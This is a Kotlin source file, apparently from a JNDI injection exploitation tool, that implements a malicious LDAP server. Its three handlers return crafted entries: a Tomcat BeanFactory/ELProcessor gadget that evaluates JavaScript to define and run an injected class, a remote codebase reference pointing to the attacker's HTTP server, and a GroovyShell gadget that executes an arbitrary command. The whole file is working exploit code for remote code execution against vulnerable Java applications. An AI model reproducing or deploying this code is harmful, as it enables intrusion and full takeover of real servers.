package ldap

import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult
import com.unboundid.ldap.sdk.Entry
import com.unboundid.ldap.sdk.LDAPResult
import com.unboundid.ldap.sdk.ResultCode
import http.PayloadGenerator
import org.apache.naming.ResourceRef
import util.Options
import util.base46cmd
import util.serialize
import util.toBase64
import javax.naming.StringRefAddr

fun LDAPServer.tomcat(result: InMemoryInterceptedSearchResult, base: String, type: String) {
    val payload = PayloadGenerator().generate(type).toBase64()

    val jsCode = """
        var bytes = org.apache.tomcat.util.codec.binary.Base64.decodeBase64('$payload');
        var classLoader = java.lang.Thread.currentThread().getContextClassLoader();
        try {
            var clazz = classLoader.loadClass('$type');
            clazz.newInstance();
        } catch(err) {
            var method = java.lang.ClassLoader.class.getDeclaredMethod('defineClass', ''.getBytes().getClass(), java.lang.Integer.TYPE, java.lang.Integer.TYPE);
            method.setAccessible(true);
            var clazz = method.invoke(classLoader, bytes, 0, bytes.length);
            clazz.newInstance();
        };
    """.trimIndent()

    val exp = """
        "".getClass()
        .forName("javax.script.ScriptEngineManager")
        .newInstance()
        .getEngineByName("JavaScript")
        .eval("$jsCode")
    """.trimIndent()

    val ref = ResourceRef(
        "javax.el.ELProcessor", null, "", "",
        true, "org.apache.naming.factory.BeanFactory", null
    ).apply {
        add(StringRefAddr("forceString", "x=eval"))
        add(StringRefAddr("x", exp))
    }
    val entry = Entry(base).apply {
        addAttribute("javaClassName", "java.lang.String")
        addAttribute("javaSerializedData", serialize(ref))
    }

    result.sendSearchEntry(entry)
    result.result = LDAPResult(0, ResultCode.SUCCESS)
}

fun LDAPServer.ref(result: InMemoryInterceptedSearchResult, base: String) {
    val codeBaseUrl = "http://${Options.address}:${Options.httpPort}/"

    val entry = Entry(base)
    val javaFactory = base.substringAfterLast("/")

    entry.run {
        addAttribute("javaClassName", "foo")
        addAttribute("javaCodeBase", codeBaseUrl)
        addAttribute("objectClass", "javaNamingReference")
        addAttribute("javaFactory", javaFactory)
    }
    result.run {
        sendSearchEntry(entry)
        setResult(LDAPResult(0, ResultCode.SUCCESS))
    }
}

fun LDAPServer.groovy(result: InMemoryInterceptedSearchResult, base: String) {
    val payload = "'${base46cmd(Options.command)}'.execute()"

    val ref = ResourceRef(
        "groovy.lang.GroovyShell", null, "", "",
        true, "org.apache.naming.factory.BeanFactory", null
    ).apply {
        add(StringRefAddr("forceString", "x=evaluate"))
        add(StringRefAddr("x", payload))
    }
    val entry = Entry(base).apply {
        addAttribute("javaClassName", "java.lang.String")
        addAttribute("javaSerializedData", serialize(ref))
    }

    result.sendSearchEntry(entry)
    result.result = LDAPResult(0, ResultCode.SUCCESS)
}
